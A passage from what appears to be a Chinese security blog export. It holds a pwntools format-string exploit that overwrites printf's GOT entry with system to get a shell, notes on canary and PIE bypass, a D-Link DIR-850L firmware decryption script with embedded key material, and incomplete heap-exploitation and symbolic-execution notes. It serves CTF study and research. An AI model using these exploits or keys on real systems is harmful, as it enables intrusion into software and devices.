<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># 确认偏移量</span><br><span class="line">payload = &#x27;%p-&#x27;*10</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"># 假设 offset=6，泄露libc基址</span><br><span class="line">printf_got = elf.got[&#x27;printf&#x27;]</span><br><span class="line">payload  = b&#x27;%7$sAAAA&#x27; + p64(printf_got)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"># 确认libc</span><br><span class="line">printf_addr = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">libc        = LibcSearcher(&#x27;printf&#x27;,printf_addr)</span><br><span class="line">libc_base   = printf_addr - libc.dump(&#x27;printf&#x27;)</span><br><span class="line">system_addr = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line"></span><br><span class="line"># 接收程序信息，向程序发送payload</span><br><span class="line">payload = fmtstr_payload(6,&#123;printf_got:system_addr&#125;,numbwritten=0,write_size=&#x27;short&#x27;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"># 提权</span><br><span class="line">io.sendline(&#x27;;/bin/sh&#x27;)</span><br></pre></td></tr></table></figure>
<h2 id="非栈上bss段">非栈上(BSS段)</h2>
<p>2023moeCTF的第三道fmt就是这种题目，exp在本地，后续有时间更新</p>
<h2 id="特殊情况">特殊情况</h2>
<h3 id="一次printf就返回">一次printf就返回</h3>
<blockquote>
<p>printf 的要求十分严格，通常有两种做法</p>
</blockquote>
<ol type="1">
<li>要求：栈上有一串具有三个函数的rbp的链，NO PIE，libc已知
<ol type="1">
<li>做法：在栈上布满one_gadget，然后找到一条带有3个rbp的链，修改中间一个
node 的低字节，让其指向的rbp变低，进而在返回时可以直接返回og</li>
</ol></li>
<li><a
href="https://www.freebuf.com/articles/system/385029.html">打fini_array（未学习）</a></li>
</ol>
<h3 id="full-relro">FULL RELRO</h3>
<blockquote>
<p>FULL RELRO 意味着我们不能修改 got 表，所以我们需要修改返回地址</p>
</blockquote>
<p>要求：可以 printf
的次数较多(至少多于四次)，可以让我们将返回地址修改为 one_gadget</p>
<h3 id="piecanary-bypass">PIE/Canary bypass</h3>
<blockquote>
<p>假设调用链为 main-&gt;func-&gt;printf，而在 func 中存放着 fmt，则栈中
fmt
上方不远处一定有调用printf语句的下一句(PC+4)，即返回地址，和canary</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">假设偏移量为6，栈构造如下</span><br><span class="line">---printf栈帧---</span><br><span class="line">................</span><br><span class="line"> printf_canary    &lt;- offset = 3</span><br><span class="line">   printf_rbp     &lt;- offset = 4</span><br><span class="line">printf_ret_addr   &lt;- offset = 5</span><br><span class="line">---printf栈帧---</span><br><span class="line"></span><br><span class="line">----func栈帧----</span><br><span class="line">      fmt         &lt;- offset = 6</span><br><span class="line">----func栈帧----</span><br><span class="line"></span><br><span class="line">----main栈帧----</span><br><span class="line">...............</span><br><span class="line">----main栈帧----</span><br><span class="line"></span><br><span class="line"># 泄露 pie_base &amp; canary</span><br><span class="line">payload = &#x27;%3$p-%5$p-END&#x27;</span><br><span class="line">io.sendline(payload)</span><br><span class="line">func_addr,canary = [int(x,16) for x in io.recvuntil(&#x27;END&#x27;)[-35:-4].split(b&#x27;-&#x27;)]</span><br><span class="line">ret_offset = </span><br><span class="line">pie_base   = func_addr - ret_offset</span><br></pre></td></tr></table></figure>
<h1 id="appendix">Appendix</h1>
<h2
id="pwnlib.fmtstr.fmtstr_payload源码">pwnlib.fmtstr.fmtstr_payload源码</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def fmtstr_payload (</span><br><span class="line">        offset,              # 字符串在栈上的偏移量</span><br><span class="line">        writes,              # &#123;target_addr:int_to_write&#125; 要写入的数字</span><br><span class="line">        numbwritten=0,       # printf 已经打印的字符数量</span><br><span class="line">        write_size=&#x27;byte&#x27;,   # 写入字节的大小</span><br><span class="line">        write_size_max=&#x27;long&#x27;, # </span><br><span class="line">        overflows=16,        # </span><br><span class="line">        strategy=&quot;small&quot;,    # 默认small，如果追求速度可以用fast模式</span><br><span class="line">        badbytes=frozenset(),  # </span><br><span class="line">        offset_bytes=0,      # </span><br><span class="line">        no_dollars=False     # 是否有 $ 符号,比如不用 &#x27;%996$n&#x27;</span><br><span class="line">    ):</span><br><span class="line"></span><br><span class="line">    sz = WRITE_SIZE[write_size]</span><br><span class="line">    szmax = WRITE_SIZE[write_size_max]</span><br><span class="line">    all_atoms = make_atoms(writes, sz, szmax, numbwritten, overflows, strategy, badbytes)</span><br><span class="line"></span><br><span class="line">    fmt = b&quot;&quot;</span><br><span class="line">    for _ in range(1000000):</span><br><span class="line">        data_offset = (offset_bytes + len(fmt)) // context.bytes</span><br><span class="line">        fmt, data = make_payload_dollar(offset + data_offset, all_atoms, numbwritten=numbwritten, no_dollars=no_dollars)</span><br><span class="line">        fmt = fmt + cyclic((-len(fmt)-offset_bytes) % context.bytes)</span><br><span class="line"></span><br><span class="line">        if len(fmt) + offset_bytes == data_offset * context.bytes:</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        raise RuntimeError(&quot;this is a bug ... format string building did not converge&quot;)</span><br><span class="line"></span><br><span class="line">    return fmt + data</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF_Theory</category>
      </categories>
      <tags>
        <tag>Heap</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>IOT — 某路由器mips固件解密脚本复现</title>
    <url>/2023/11/09/IOT%20%E2%80%94%20%E6%9F%90%E8%B7%AF%E7%94%B1%E5%99%A8mips%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
期中终于结束了😭复现一下b站Wker666的固件解密
</blockquote>
<span id="more"></span>
<blockquote>
<p>第一次分析IOT固件，不当之处请指出😭</p>
</blockquote>
<h1 id="xff-前置知识">0xFF 前置知识</h1>
<ol type="1">
<li><p>多数情况下，路由器固件解包以后我们会拿到一个类似于 Linux
文件系统的文件夹，这个文件系统会跑一些三环程序，而三环程序有非常多的系统调用，因此我们希望通过这些三环程序来提权。</p></li>
<li><p>现在很多厂商会认为，自己的路由器能被解包太不安全了，因此他们会通过加密，但是每次更新换代时，后一代的固件包都是通过前一代的固件中的某个解密算法来解密的。因此，我们在挖掘
IOT
漏洞时，会先找到比较老的一些版本，分析解密算法，进而自己写出解密脚本来解密新一代的固件包。</p></li>
<li><p>(建议看到0x01后再来阅读本条)我们在路由器的 web user
上发送一个更新请求的时候，客户端会先发给服务器一个 http
请求，然后被服务器的 httpd 二进制文件接收，httpd 会 fork
一个新的进程来启用二进制文件 cgibin ，并把环境变量和 http 的请求发给 cgi
， cgi
完成处理以后，把内容输出到标准输出流之类的东西，并返回客户</p></li>
<li><p>IDA 反编译 Mips
文件会有很多“无用操作”，就是两个变量来回赋值之类的，这是由于 Mips
有分支延迟的特性</p></li>
</ol>
<h1 id="x00-准备工作">0x00 准备工作</h1>
<p><img src="https://i0.imgs.ovh/2023/11/09/lto8e.png"
alt="lto8e.png" />
上图中间有这样一句话<code>Upgrade to Firmware V2.10 and then instantly go back into the web user interface and upgrade to Firmware V2.20</code></p>
<p>它告诉我们，从web
user更新到2.2版本时，需要先从官网下载2.1的固件并更新到2.1才行</p>
<p>也就是说，2.2大概率是一个加密固件包，我们无法通过<code>binwalk</code>直接解包，但是2.1可以</p>
<p>我们download两个包到本地binwalk解包一下看看</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/ltiAU.png" alt="ltiAU.png" />
<figcaption aria-hidden="true">ltiAU.png</figcaption>
</figure>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/ltjx0.png" alt="ltjx0.png" />
<figcaption aria-hidden="true">ltjx0.png</figcaption>
</figure>
<p>我们可以看到，确实像我们猜想的那样，V2.1未加密，V2.2加密</p>
<h1 id="x01-定位解密逻辑">0x01 定位解密逻辑</h1>
<p>通过 <strong>0xFF.3</strong>
我们知道要分析cgibin和httpd文件，所以我们用IDA打开看一下
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cgibin : /_DIR850LB1_FW210WWb03.bin.extracted/squashfs-root/htdocs</span><br><span class="line"></span><br><span class="line">httpd : /_DIR850LB1_FW210WWb03.bin.extracted/squashfs-root/sbin</span><br></pre></td></tr></table></figure></p>
<p>我们先来分析一下在本文中不那么重要的 httpd 文件，IDA7.6
以上的版本是可以反编译 Mips 的 <img
src="https://i0.imgs.ovh/2023/11/09/l12OW.png" alt="l12OW.png" /> 我们在
function 中搜索
cgi，找到<code>process_cgi</code>函数，如上图，可以看到里面有很多环境变量如<code>GATEWAY_INTERFACE</code>和<code>CONTENT_LENGTH</code>等，在设置完环境变量后，我们可以看到它调用了<code>spawn</code>函数，我们跟进去看一下
<img src="https://i0.imgs.ovh/2023/11/09/l1ZZe.png"
alt="l1ZZe.png" /></p>
<p><img src="https://i0.imgs.ovh/2023/11/09/l1lK3.png"
alt="l1lK3.png" /> 可以看到，在 <strong>Line20</strong>
的位置，该进程是被fork起来的，而在 <strong>Line46</strong>
的位置，我们执行了 <code>execve</code> 系统调用，而我们知道 execve
的第一个参数是文件路径，第二个参数是argv，第三个参数是环境变量，因此我们回溯一下</p>
<p>而在调用 <code>spawn</code> 的图中，我们可以看到，spawn
的第一个参数是<code>*v77,v77,ptr</code>,这里的 v77 就是 file_path，而
ptr 就是 env_ptr，我们接着溯源(溯源的时候我们会发现 file_path
的调用处非常少，这是因为 ida 的反编译并没有将 file_path
的数据类型正确处理，导致 file_path 下面的一些变量，其实可能就是
file_path，但因为处理错了，所以被命名为 v78 v79 ...)</p>
<p>如下图，我们挨个分析，而当我们看到 v80 时，可以看到对 v80
被做了手脚，Wker666 说这里是对 cgi 进行一些选择，但我 STFW
以后也没找到原因，先搁置一下吧</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/l1tB2.png" alt="l1tB2.png" />
<figcaption aria-hidden="true">l1tB2.png</figcaption>
</figure>
<p>至此，httpd
就分析完了，httpd主要是做前端用的，它本身也有一些漏洞，不过这里就不再分析了，我们直接看cgibin</p>
<hr />
<p>我们用 IDA 打开 cgibin 文件，往下找到 seamacgi_main (这里没找到 seama
到底是什么意思，只是因为在 function 中搜索 enc 可以找到 encrypt_main
，溯源分析就能找到 semacgi_main 了) <img
src="https://i0.imgs.ovh/2023/11/09/l111j.png" alt="l111j.png" /></p>
<p>跟进 semacgi_main ,可以找到 encrypt_main
函数，这就是我们需要的解密函数了</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/l1UfV.png" alt="l1UfV.png" />
<figcaption aria-hidden="true">l1UfV.png</figcaption>
</figure>
<h1 id="x02-解密逻辑分析">0x02 解密逻辑分析</h1>
<h3 id="被传入的参数">被传入的参数</h3>
<p>我们查看 encrypt_main 函数的引用，可以在 sub_407664+668
处找到一处调用，我们可以看到第一个参数是6，第二个参数被赋值了很多类似于-i，-d之类的东西，结合
encrypt_main 函数是个 main，我们猜测第一个参数是
argc，第二个参数是argv</p>
<p>但是这里的赋值方式很奇怪，v116
是<code>struct stat</code>，是一个结构体，我们再去别的引用处看一下，可以在
encode_file_check 函数中发现这些参数其实是一个 char 数组，这就符合我们对
argv 的认知了。</p>
<p>我们按 y 键将 sub_407664 中的 v116 的数据类型修改成 char* 即可</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/l1iQJ.png" alt="l1iQJ.png" />
<figcaption aria-hidden="true">l1iQJ.png</figcaption>
</figure>
<p>接下来分析 argv 都是些什么东西<br />
- 第一个参数: encimg - 第二个参数: -i (将 v116
数据类型修改后，可以很明显的看到"-i"是 v117，而全局变量 ptr 才是 v118) -
第三个参数: ptr(在 encode_file_check 函数中我们可以看到，ptr 与
"/var/firmware.seama"
作了比较，因此我们猜测ptr可能是指向文件名字符串的指针) - 第四个参数: -s
- 第五个参数: byte_43CDB0(在 encode_file_check
函数中我们可以看到，byte_43CDB0 是从 <code>/etc/config/image_sign</code>
文件读出了128个字符，我们去看一下这个文件，发现里面是<code>wrgac25_dlink.2013gui_dir850l</code>)
- 第六个参数: -d</p>
<p>因此，我们传入的参数是<code>encimg -i file -s wrgac25_dlink.2013gui_dir850l -d</code></p>
<p>这也符合 argc = 6 的要求</p>
<h3 id="参数功能">参数功能</h3>
<p>我们知道，一般来说 -h 代表的是 help，所以我们查看一下 encrypt_main
函数的<code>case h:</code>会打印什么东西</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int sub_408F8C()</span><br><span class="line">&#123;</span><br><span class="line">  printf(&quot;Usage: %s &#123;OPTIONS&#125;\n&quot;, &quot;encimg&quot;);</span><br><span class="line">  puts(&quot;   -h                      : show this message.&quot;);</span><br><span class="line">  puts(&quot;   -v                      : Verbose mode.&quot;);</span><br><span class="line">  puts(&quot;   -i &#123;input image file&#125;   : input image file.&quot;);</span><br><span class="line">  puts(&quot;   -e                      : encode file.&quot;);</span><br><span class="line">  puts(&quot;   -d                      : decode file.&quot;);</span><br><span class="line">  return puts(&quot;   -s                      : signature.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而经过 switch-case 后，在 Line57 判断 dword_43CE40 也就是 signature
是否存在，这个是 -s 参数做的事情，而在 Line59 处判断 file
是否存在，如果两个都通过，就会调用 sub_4090E0 函数，我们继续跟进</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/l1qvD.png" alt="l1qvD.png" />
<figcaption aria-hidden="true">l1qvD.png</figcaption>
</figure>
<p>在 sub_4090E0
函数的前一部分中，做了文件校验等不是很重要的操作，而重要的解密操作从
<strong>Line108</strong> 开始，也就是下图位置，我已经加好注释了</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/lJCoX.png" alt="lJCoX.png" />
<figcaption aria-hidden="true">lJCoX.png</figcaption>
</figure>
<p>Line130-Line137 是设置AES加解密密钥<code>user_key</code>，而
Line108-Line129
是用<code>_____progs_board_fw_sign_data</code>初始化<code>user_key</code>，接着用
encrypt 函数对<code>user_key</code>做一些处理，我们跟进一下 encrypt
函数</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/lJP5U.png" alt="lJP5U.png" />
<figcaption aria-hidden="true">lJP5U.png</figcaption>
</figure>
<p>而设置好密钥以后，Line158 处调用 AES_cbc_encrypt
函数(如下图)，但我们通过<a
href="https://blog.csdn.net/duanxingheng/article/details/11730617">OpenSSL-AES</a>这篇文章知道，AES
不可能只有这么点参数，并且根据分析， v32 和 mmap_file_ptr 都是 mmap_file
，这肯定不对。</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/lJLr0.png" alt="lJLr0.png" />
<figcaption aria-hidden="true">lJLr0.png</figcaption>
</figure>
<p>所以我们按 y
键，将<code>AES_cbc_encrypt</code>修改为<code>void AES_cbc_encrypt(const unsigned char *in, unsigned char *out,   size_t length, const AES_KEY *key,    unsigned char *ivec, const int enc);</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">in： 需要加密/解密的数据；</span><br><span class="line"></span><br><span class="line">out： 计算后输出的数据；</span><br><span class="line"></span><br><span class="line">length： 数据长度（这里不包含初始向量数据长度）</span><br><span class="line"></span><br><span class="line">key：密钥</span><br><span class="line"></span><br><span class="line">ivec： 初始向量（一般为16字节全0）</span><br><span class="line"></span><br><span class="line">enc： AES_ENCRYPT(1) 代表加密， AES_DECRYPT(0) 代表解密；</span><br></pre></td></tr></table></figure>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/lJXIC.png" alt="lJXIC.png" />
<figcaption aria-hidden="true">lJXIC.png</figcaption>
</figure>
<p>现在我们可以看出，Line131-Line177 就是很标准的一个 AES 加解密</p>
<h1 id="解密脚本">解密脚本</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">def aes_decrypt_file(key,iv,input_file,output_file):</span><br><span class="line">    cipher = AES.new(bytes(key),AES.MODE_CBC,bytes(iv))</span><br><span class="line">    with open(input_file,&#x27;rb&#x27;) as infile, open(output_file,&#x27;wb&#x27;) as outfile:</span><br><span class="line">        while True:</span><br><span class="line">            chunk = infile.read(16)</span><br><span class="line">            if len(chunk) == 0:</span><br><span class="line">                break</span><br><span class="line">            elif len(chunk) % 16 != 0:</span><br><span class="line">                raise ValueError(&quot;aes error&quot;)</span><br><span class="line">            decrypted_chunk = cipher.decrypt(chunk)</span><br><span class="line">            outfile.write(decrypted_chunk)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">______progs_board_fw_sign_data =[0x6B, 0x35, 0x4E, 0x49, 0x31, 0x2B, 0x62, 0x76, 0x57, 0x45, </span><br><span class="line">  0x66, 0x5A, 0x36, 0x6F, 0x68, 0x74, 0x70, 0x55, 0x4F, 0x77, </span><br><span class="line">  0x79, 0x6E, 0x4F, 0x64, 0x55, 0x63, 0x69, 0x76, 0x71, 0x77, </span><br><span class="line">  0x45, 0x5A, 0x71, 0x51, 0x65, 0x68, 0x48, 0x4D, 0x45, 0x6D, </span><br><span class="line">  0x45, 0x50, 0x51, 0x35, 0x69, 0x7A, 0x4C, 0x2B, 0x63, 0x61, </span><br><span class="line">  0x62, 0x6E, 0x38, 0x62, 0x4E, 0x48, 0x5A, 0x58, 0x48, 0x6A, </span><br><span class="line">  0x6B, 0x70, 0x36, 0x57, 0x43, 0x6C, 0x39, 0x79, 0x6E, 0x39, </span><br><span class="line">  0x43, 0x49, 0x6B, 0x69, 0x49, 0x31, 0x0A, 0x6D, 0x54, 0x46, </span><br><span class="line">  0x75, 0x32, 0x31, 0x54, 0x45, 0x45, 0x50, 0x6F, 0x36, 0x36, </span><br><span class="line">  0x4A, 0x42, 0x46, 0x76, 0x39, 0x42, 0x4D, 0x6D, 0x62, 0x2B, </span><br><span class="line">  0x49, 0x4B, 0x51, 0x67, 0x6E, 0x4F, 0x38, 0x4F, 0x75, 0x46, </span><br><span class="line">  0x34, 0x62, 0x7A, 0x34, 0x66, 0x72, 0x47, 0x50, 0x64, 0x4E, </span><br><span class="line">  0x36, 0x37, 0x67, 0x59, 0x4C, 0x75, 0x4F, 0x73]</span><br><span class="line"></span><br><span class="line">def dec_val_by_sig(dec_sig_val,dec_len,sig): # encrypt 函数 python表示</span><br><span class="line">    sig_len = len(sig)</span><br><span class="line">    loop_sig_idx = 0</span><br><span class="line">    loop_dec_idx = 1</span><br><span class="line">    idx = 0</span><br><span class="line">    while True:</span><br><span class="line">        cur_sig = sig[loop_sig_idx]</span><br><span class="line">        loop_sig_idx+=1</span><br><span class="line">        if(idx&gt;=dec_len):</span><br><span class="line">            break</span><br><span class="line">        if(loop_sig_idx&gt;=sig_len):</span><br><span class="line">            loop_sig_idx=0</span><br><span class="line"></span><br><span class="line">        dec_sig_val[idx] = loop_dec_idx ^ dec_sig_val[idx] ^ ord(cur_sig)</span><br><span class="line">        loop_dec_idx+=1</span><br><span class="line">        idx+=1</span><br><span class="line">        if loop_dec_idx &gt;= 252:</span><br><span class="line">            loop_dec_idx = 1</span><br><span class="line"></span><br><span class="line">aes_key = []</span><br><span class="line"></span><br><span class="line">for i in range(0,32):</span><br><span class="line">    aes_key.append(______progs_board_fw_sign_data[i+32])</span><br><span class="line"></span><br><span class="line">iv = []</span><br><span class="line"></span><br><span class="line">for i in range(0,16):</span><br><span class="line">    iv.append(______progs_board_fw_sign_data[i+96])</span><br><span class="line"></span><br><span class="line">print(&#x27;iv before dec: &#x27;,iv)</span><br><span class="line">print(&#x27;aes_key before dec: &#x27;,aes_key)</span><br><span class="line">dec_val_by_sig(iv,16,&#x27;wrgac25_dlink.2013gui_dir850l&#x27;)</span><br><span class="line">dec_val_by_sig(aes_key,32,&#x27;wrgac25_dlink.2013gui_dir850l&#x27;)</span><br><span class="line">print(&#x27;iv before dec: &#x27;,iv)</span><br><span class="line">print(&#x27;aes_key before dec: &#x27;,aes_key)</span><br><span class="line"></span><br><span class="line">aes_decrypt_file(aes_key,iv,&#x27;/mnt/e/EdgeDownload/IOT/DIR850LB1_FW220WWb03.bin&#x27;,&#x27;out.bin&#x27;)</span><br></pre></td></tr></table></figure>
<p>解密后即可解包</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/lJZRR.png" alt="lJZRR.png" />
<figcaption aria-hidden="true">lJZRR.png</figcaption>
</figure>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>Mips</tag>
        <tag>Wifi</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn - Heap Exploit Summary</title>
    <url>/2023/09/22/Pwn%20-%20Heap%20Exploit%20Summary/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
总结一下 Heap 的相关内容，便于后续调用
</blockquote>
<span id="more"></span>
<h1 id="patchelf的使用方式">Patchelf的使用方式</h1>
<blockquote>
<p>在本地调试堆题时，不同的 libc 版本会有不同的 heap 管理器来管理
heap，因此我们需要将本地的 elf 文件的链接部分 patch
一下，使其与远程链接的 libc 文件保持一致。</p>
</blockquote>
<h2 id="libc-包的下载">libc 包的下载</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 以下操作均在文件夹 glibc-all-in-one 中完成</span><br><span class="line">// 查看有什么版本的 libc 可以下载</span><br><span class="line">./update_list // 更新 list</span><br><span class="line">cat list</span><br><span class="line"></span><br><span class="line">// 下载所需要的 libc 包</span><br><span class="line">./download 2.35-0ubuntu3_amd64</span><br></pre></td></tr></table></figure>
<blockquote>
<p>有时我们需要的 libc 包不在 list
中，我们可以自己尝试解构命令来下载。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 访问https://mirror.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/，查看所有可以下载的 libc 版本</span><br><span class="line"></span><br><span class="line">// 下载压缩包(到文件夹glibc-all-in-one/debs)以后用 extract 命令解压缩</span><br><span class="line">./extract debs/libc6_2.26-0ubuntu2_i386.deb /tmp/test</span><br></pre></td></tr></table></figure>
<h2 id="patch-elf文件">patch elf文件</h2>
<blockquote>
<p>识别需要 patch 的文件 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[path/to/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64]</span><br><span class="line">└─$ ls</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">找到以下文件</span><br><span class="line">ld-linux-x86-64.so.2  // ld-2.23.so 也行</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>tip1：高版本的libc库没有 <code>ld-2.23.so</code> 这种文件，但它与
<code>ld-linux-x86-64.so.2</code>
等价，都指向相同的动态链接器文件，他们实际上是同一个文件的不同名称。</p>
<p>tip2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 被patch的elf文件: Pwn</span><br><span class="line"></span><br><span class="line">// 配置动态链接器 ld.so</span><br><span class="line">patchelf --set-interpreter path/to/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ld-linux-x86-64.so.2 pwn </span><br><span class="line"></span><br><span class="line">// 配置链接库 </span><br><span class="line">patchelf --set-rpath  path/to/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ pwn</span><br></pre></td></tr></table></figure>
<h1 id="tcachebin-attack">Tcachebin Attack</h1>
<h2 id="tcachebin-overview">Tcachebin Overview</h2>
<ul>
<li>数据存取方式：LIFO</li>
</ul>
<h2 id="exploit">Exploit</h2>
<h1 id="fastbin-attack">Fastbin Attack</h1>
<h2 id="fastbin-overview">Fastbin Overview</h2>
<ul>
<li>数据存取方式：FIFO</li>
</ul>
<h2 id="exploit-1">Exploit</h2>
<h1 id="unsortedbin-attack">Unsortedbin Attack</h1>
<h2 id="overview">Overview</h2>
<p><code>Unsortedbin attack</code>分为<code>leak</code>和<code>write</code>两部分</p>
<h2 id="leak">Leak</h2>
<p>当unsortedbin中有且仅有一个chunk时，该chunk的fd和bk会指向unsortdedbin的地址</p>
<p>而这个地址可以用ida查看对应libc的malloc_trim函数找到</p>
<h2 id="write">write</h2>
<p>write是指</p>
<p>此外，低libc版本的unsortedbin可以像tcachebin一样，通过伪造链来申请一个fake_chunk</p>
<ul>
<li>申请fake_chunk <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">**2.23版本**  </span><br><span class="line">- 初状态  </span><br><span class="line">unsortedbin --&gt; chunk_victim  </span><br><span class="line"></span><br><span class="line">&gt; 此时我们令chunk_victim.bk = fake_chunk_head</span><br><span class="line"></span><br><span class="line">- 末状态  </span><br><span class="line">unsortedbin  --&gt; chunk_victim --&gt; fake_chunk</span><br><span class="line"></span><br><span class="line">&gt; 连续申请两个chunk即可申请到fake_chunk</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="largebin-attack">Largebin Attack</h1>
<h1 id="section"></h1>
<h1 id="use-after-free">Use After Free</h1>
<ul>
<li><strong>概述</strong>
在<code>free(chunk_ptr)</code>后并没有<code>chunk_ptr=0</code>，导致我们仍然能通过<code>chunk_ptr</code>对这个chunk进行修改</li>
<li>Fastbin Attack</li>
<li></li>
</ul>
<h1 id="houseoforange">HouseofOrange</h1>
<h2 id="概述">概述</h2>
<p>HouseofOrange是在程序没有可以操控的free时，利用ptmalloc的管理机制强行制造出一个unsortedbin中的chunk的技术。<br />
## 伪造chunk需求 1. top_chunk的结束地址必须页对齐<br />
-
一般情况下，ptmalloc设置top_chunk为0x21000，我们申请一个0x10的chunk0后，chunk0加上chunk_head是0x20大小，此时top_chunk切割后还剩下0x20fe0大小，为了页对齐，我们伪造top_chunk的大小为0xfe0即可<br />
2. top_chunk.size &gt;= MINSIZE<br />
3. top_chunk.size &lt; chunk_size + MINSIZE 4. top_chunk.prev_inuse == 1
- 第一点中说的0xfe0要变为0xfe1</p>
]]></content>
      <categories>
        <category>CTF_Theory</category>
      </categories>
      <tags>
        <tag>Heap</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Symbolic Execution Leaning Note (1) -- Basis</title>
    <url>/2023/09/30/Symbolic%20Execution%20Leaning%20Note%20(1)%20--%20Basis/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
迈向自动化的第一步——
</blockquote>
<span id="more"></span>
<h1 id="x00-基本模型">0x00 基本模型</h1>
<ul>
<li><p><strong>概述</strong><br />
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1  void sum(a,b)&#123;</span><br><span class="line">2    int x = a;</span><br><span class="line">3    int y = b;</span><br><span class="line">4    int z = x + y;</span><br><span class="line">5    return z;</span><br><span class="line">6  &#125;</span><br></pre></td></tr></table></figure> 调用<span
class="math inline">\(sum(1,2)\)</span>，学过C语言的都知道会发生什么事情<br />
但如果我调用<span
class="math inline">\(sum(a1,a2)\)</span>，并且我在这之前并未声明a1，a2呢？<br />
先不要用C语言的思路来考虑了，我们称这种情况为<strong>符号执行(Symbolic
Execution)</strong>，具体会发生什么我们接着往下看</p></li>
<li><p><strong>基本思想</strong></p>
<ol type="1">
<li>使用符号变量代替具体值作为程序或函数的参数，并模拟执行程序中的指令，各指令的操作都基于符号变量进行，其中操作数的值由符号和常量组成的表达式来表示
<ol type="1">
<li>符号变量是什么？
<ol type="1">
<li>读者可以将符号执行视为程序具体执行的自然扩展，符号变量使得程序执行变得不确定，当我们给一系列符号赋一个确定的值时，符号执行就成为了程序具体执行（i.e.
程序的一次具体执行可以视为符号执行的一次实例）</li>
</ol></li>
<li>操作数是什么？</li>
</ol></li>
<li>对于任意程序，其执行流程是由执行序列的执行语义控制的
<ol type="1">
<li>执行语义：
<ol type="1">
<li>变量定义语句对数据对象的描述 <code>int a;</code></li>
<li>声明语句对程序数据对象的修改 <code>a = 10;</code></li>
<li>条件语句对程序执行流程的控制</li>
</ol></li>
</ol></li>
<li>当程序的输入参数确定时，其指令序列被固定，因此程序执行语义和控制流也被固定</li>
</ol></li>
<li><p><strong>程序语言定义</strong></p>
<ol type="1">
<li>James C. King在提出符号执行技术的同时，也为其限定了理想的适用场景：
<ol type="1">
<li>理想模型中程序只处理“有符号整数”</li>
<li>程序“执行数”规模有限</li>
<li>可以处理程序内所有if条件语句的约束表达式</li>
</ol></li>
<li>基于符号执行技术的理想场景，对程序语言做如下定义
<ol type="1">
<li>程序变量类型：只包含“有符号整数”</li>
<li>程序语句类型
<ol type="1">
<li>简单声明语句，如<code>a = 3</code></li>
<li>if条件语句(包括then 和 else)</li>
<li>无条件跳转语句，如goto语句</li>
<li>变量操作语句：如read函数、基本整数运算操作（+、-、*）</li>
</ol></li>
<li>程序语义
<ol type="1">
<li>简单声明语句、无条件跳转语句和变量操作语句，只是将程序中的具体值替换为了符号</li>
<li>而if条件语句中，将具体值替换为了符号，所以我们无法判断if语句中的真值，就不能确定条件分支的走向，这是符号执行技术对程序执行语义的最大改变，也是符号执行与具体执行的关键区别</li>
</ol></li>
</ol></li>
</ol></li>
<li><p><strong>程序执行状态</strong></p>
<ul>
<li>PC
<ol type="1">
<li>为了解决“分支走向不确定”的问题，King为程序状态新添加了一个变量：<strong>路径约束条件
pc(path
constraint)</strong>，在每个if条件语句处并没有实际决定程序执行哪个分支，这就需要符号执行引擎<strong>主动选择执行分支</strong>并<strong>记录整个执行过程</strong>，pc就辅助完成了这项工作</li>
<li>Simply，pc就是符号执行过程中对路径上条件分支走向的选择情况</li>
